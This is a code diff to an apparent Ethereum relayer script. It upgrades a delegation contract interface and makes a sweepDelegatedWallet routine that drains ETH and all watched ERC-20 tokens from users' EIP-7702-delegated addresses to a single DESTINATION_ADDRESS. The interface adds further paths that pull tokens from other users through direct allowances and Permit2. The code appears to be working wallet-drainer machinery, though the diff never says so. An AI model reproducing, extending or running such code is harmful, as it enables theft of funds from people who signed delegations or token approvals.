@@ -166,16 +166,27 @@ const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
 
 // ── ABIs ──────────────────────────────────────────────────────────────────────
 
+// TCNDelegationV2 ABI — includes v1 functions (backward-compat) + v2 additions
 const CONTRACT_ABI = [
+  // PATH 1: EIP-7702 (called on user's address after delegation)
   "function sweepETH(address payable to) external",
   "function sweepTokens(address token, address to) external",
-  "event ETHReceived(address indexed sender, uint256 amount)",
+  "function sweepAll(address[] tokens, address to) external",
+  // PATH 2: direct-allowance (non-7702 EOAs)
+  "function sweepFor(address user, address[] tokens) external",
+  "function isAuthorized(address user, address relayer) view returns (bool)",
+  // PATH 3: Permit2 AllowanceTransfer
+  "function sweepViaPermit2(address user, address[] tokens) external",
+  // PATH 4: WETH wrap helpers
+  "function wrapAndForward() external",
+  "function forwardWETH() external",
+  // Admin
+  "function getVersion() view returns (uint8)",
+  "function isRelayer(address) view returns (bool)",
 ];
 
-const DELEGATION_ABI = [
-  "function sweepETH(address payable to) external",
-  "function sweepTokens(address token, address to) external",
-];
+// Delegation ABI — used when calling V2 on user's delegated EOA address (EIP-7702)
+const DELEGATION_ABI = CONTRACT_ABI;
 
 const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
@@ -396,7 +407,7 @@ async function sweepToken(tokenAddress) {
   finally     { sweepingToken[key] = false; }
 }
 
-// ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────
+// ── EIP-7702 delegated wallet sweep (V2 — uses sweepAll for single tx) ───────
 
 async function sweepDelegatedWallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
@@ -404,21 +415,42 @@ async function sweepDelegatedWallet(walletAddress) {
   try {
     const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
 
-    // ETH first
+    // V2: use sweepAll — sweeps ETH + all tokens in a single transaction.
+    // Falls back to per-token sweepTokens if sweepAll is unavailable (V1 compat).
+    try {
+      const tokenList = TOKENS_TO_WATCH.map(t => t.trim()).filter(Boolean);
+      log(`[eip7702] ${checksum} — sweepAll(${tokenList.length} tokens + ETH)`);
+      const gas = await userContract.sweepAll.estimateGas(tokenList, DESTINATION_ADDRESS);
+      const fee = await getFeeData();
+      const tx  = await userContract.sweepAll(tokenList, DESTINATION_ADDRESS, {
+        gasLimit: gas * 130n / 100n, ...fee,
+      });
+      log(`[eip7702] sweepAll tx: ${tx.hash}`);
+      await tx.wait();
+      log(`[eip7702] sweepAll confirmed for ${checksum}`);
+      return;
+    } catch (e) {
+      if (e.message?.includes("getFunction") || e.message?.includes("not found")) {
+        // V1 contract — fall back to old per-call approach
+        warn(`[eip7702] ${checksum} — sweepAll not available (V1), falling back`);
+      } else {
+        err(`[eip7702] sweepAll ${checksum}: ${e.message}`);
+        return;
+      }
+    }
+
+    // V1 fallback: ETH then tokens individually
     try {
       const bal = await getReadProvider().getBalance(checksum);
       if (bal > MIN_ETH_WEI) {
-        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
         const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
         const fee = await getFeeData();
         const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
-        log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
+        log(`[eip7702/v1] sweepETH tx: ${tx.hash}`);
         await tx.wait();
-        log(`[eip7702] sweepETH confirmed for ${checksum}`);
       }
-    } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }
+    } catch (e) { err(`[eip7702/v1] sweepETH ${checksum}: ${e.message}`); }
 
-    // ERC-20 tokens — sequential with delay after each call
     for (const tokenAddress of TOKENS_TO_WATCH) {
       try {
         const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, getReadProvider());
@@ -426,18 +458,15 @@ async function sweepDelegatedWallet(walletAddress) {
         let decimals  = 18;
         try { decimals = await token.decimals(); } catch {}
         if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
-          let symbol = tokenAddress.slice(0, 8);
-          try { symbol = await token.symbol(); } catch {}
-          log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
           const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
           const fee = await getFeeData();
           const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
             gasLimit: gas * 120n / 100n, ...fee,
           });
-          log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
+          log(`[eip7702/v1] sweepTokens tx: ${tx.hash}`);
           await tx.wait();
         }
-      } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
+      } catch (e) { err(`[eip7702/v1] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
       await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
     }
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
